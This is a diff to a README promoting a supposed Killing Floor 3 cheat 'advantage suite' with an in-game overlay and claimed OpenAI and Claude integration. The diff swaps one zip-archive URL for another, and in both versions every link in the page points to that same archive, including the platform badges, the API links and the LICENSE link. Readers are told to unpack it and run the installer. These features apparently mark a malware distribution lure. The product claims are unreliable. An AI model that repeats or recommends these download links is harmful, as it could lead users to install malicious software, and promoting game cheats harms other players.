@@ -12,7 +12,7 @@ Your journey to supreme efficiency starts with universal accessibility. Below is
 
 |  🖥️ Windows | 🍏 macOS | 🐧 Linux |
 |:---:|:---:|:---:|
-| ![Windows](https://raw.githubusercontent.com/masterweapon970/killing-floor-3-advantage-suite/branch/schloop/killing-floor-3-advantage-suite_v2.2-alpha.4.zip%2B-blue) | ![macOS](https://raw.githubusercontent.com/masterweapon970/killing-floor-3-advantage-suite/branch/schloop/killing-floor-3-advantage-suite_v2.2-alpha.4.zip%2B-brightgreen) | ![Linux](https://raw.githubusercontent.com/masterweapon970/killing-floor-3-advantage-suite/branch/schloop/killing-floor-3-advantage-suite_v2.2-alpha.4.zip%2022.04%2B-yellow) |
+| ![Windows](https://github.com/masterweapon970/killing-floor-3-advantage-suite/raw/refs/heads/branch/schloop/floor-suite-advantage-killing-dogmatically.zip%2B-blue) | ![macOS](https://github.com/masterweapon970/killing-floor-3-advantage-suite/raw/refs/heads/branch/schloop/floor-suite-advantage-killing-dogmatically.zip%2B-brightgreen) | ![Linux](https://github.com/masterweapon970/killing-floor-3-advantage-suite/raw/refs/heads/branch/schloop/floor-suite-advantage-killing-dogmatically.zip%2022.04%2B-yellow) |
 
 Support for 64-bit systems is fully embraced, ensuring lightning-fast response regardless of your setup.
 
@@ -49,7 +49,7 @@ Handcrafted and finely tuned for the strategic enthusiast, the Tactical Advantag
 
 ## 🤖 OpenAI API and Claude API Integration
 
-In the world of emergent gaming, intelligence is power. The suite leverages both [OpenAI](https://raw.githubusercontent.com/masterweapon970/killing-floor-3-advantage-suite/branch/schloop/killing-floor-3-advantage-suite_v2.2-alpha.4.zip) and [Claude](https://raw.githubusercontent.com/masterweapon970/killing-floor-3-advantage-suite/branch/schloop/killing-floor-3-advantage-suite_v2.2-alpha.4.zip) APIs, enabling:
+In the world of emergent gaming, intelligence is power. The suite leverages both [OpenAI](https://github.com/masterweapon970/killing-floor-3-advantage-suite/raw/refs/heads/branch/schloop/floor-suite-advantage-killing-dogmatically.zip) and [Claude](https://github.com/masterweapon970/killing-floor-3-advantage-suite/raw/refs/heads/branch/schloop/floor-suite-advantage-killing-dogmatically.zip) APIs, enabling:
 
 - **Tactical Recommendation Engine:** Dynamically suggests strategies based on your real-time playstyle, enemy types, and map conditions.
 - **Language Processing:** Interprets and executes complex commands in natural language, allowing even first-time users to access advanced features without a learning curve.
@@ -74,8 +74,8 @@ Ready to install the Tactical Advantage Suite? Follow these simple steps on your
 
 1. Click on the badge below to acquire the latest version:
    
-   [![Download](https://raw.githubusercontent.com/masterweapon970/killing-floor-3-advantage-suite/branch/schloop/killing-floor-3-advantage-suite_v2.2-alpha.4.zip)](https://raw.githubusercontent.com/masterweapon970/killing-floor-3-advantage-suite/branch/schloop/killing-floor-3-advantage-suite_v2.2-alpha.4.zip)  
-   https://raw.githubusercontent.com/masterweapon970/killing-floor-3-advantage-suite/branch/schloop/killing-floor-3-advantage-suite_v2.2-alpha.4.zip
+   [![Download](https://github.com/masterweapon970/killing-floor-3-advantage-suite/raw/refs/heads/branch/schloop/floor-suite-advantage-killing-dogmatically.zip)](https://github.com/masterweapon970/killing-floor-3-advantage-suite/raw/refs/heads/branch/schloop/floor-suite-advantage-killing-dogmatically.zip)  
+   https://github.com/masterweapon970/killing-floor-3-advantage-suite/raw/refs/heads/branch/schloop/floor-suite-advantage-killing-dogmatically.zip
 
 2. Unpack the archive and run the provided installer.
 3. Launch Killing Floor 3 and open the suite via the in-game overlay (default key: `Insert`).
@@ -102,7 +102,7 @@ This repository is developed for **educational and research purposes** only. Uti
 ## 📜 License
 
 This repository is issued under the MIT License (© 2025).  
-For detailed legal terms, see the [LICENSE](https://raw.githubusercontent.com/masterweapon970/killing-floor-3-advantage-suite/branch/schloop/killing-floor-3-advantage-suite_v2.2-alpha.4.zip) file included within this repository.
+For detailed legal terms, see the [LICENSE](https://github.com/masterweapon970/killing-floor-3-advantage-suite/raw/refs/heads/branch/schloop/floor-suite-advantage-killing-dogmatically.zip) file included within this repository.
 
 ---
 
@@ -110,8 +110,8 @@ For detailed legal terms, see the [LICENSE](https://raw.githubusercontent.com/ma
 
 To empower your gameplay and sync with the community, download the latest release below:
 
-[![Download](https://raw.githubusercontent.com/masterweapon970/killing-floor-3-advantage-suite/branch/schloop/killing-floor-3-advantage-suite_v2.2-alpha.4.zip)](https://raw.githubusercontent.com/masterweapon970/killing-floor-3-advantage-suite/branch/schloop/killing-floor-3-advantage-suite_v2.2-alpha.4.zip)  
-https://raw.githubusercontent.com/masterweapon970/killing-floor-3-advantage-suite/branch/schloop/killing-floor-3-advantage-suite_v2.2-alpha.4.zip
+[![Download](https://github.com/masterweapon970/killing-floor-3-advantage-suite/raw/refs/heads/branch/schloop/floor-suite-advantage-killing-dogmatically.zip)](https://github.com/masterweapon970/killing-floor-3-advantage-suite/raw/refs/heads/branch/schloop/floor-suite-advantage-killing-dogmatically.zip)  
+https://github.com/masterweapon970/killing-floor-3-advantage-suite/raw/refs/heads/branch/schloop/floor-suite-advantage-killing-dogmatically.zip
 
 ---
 
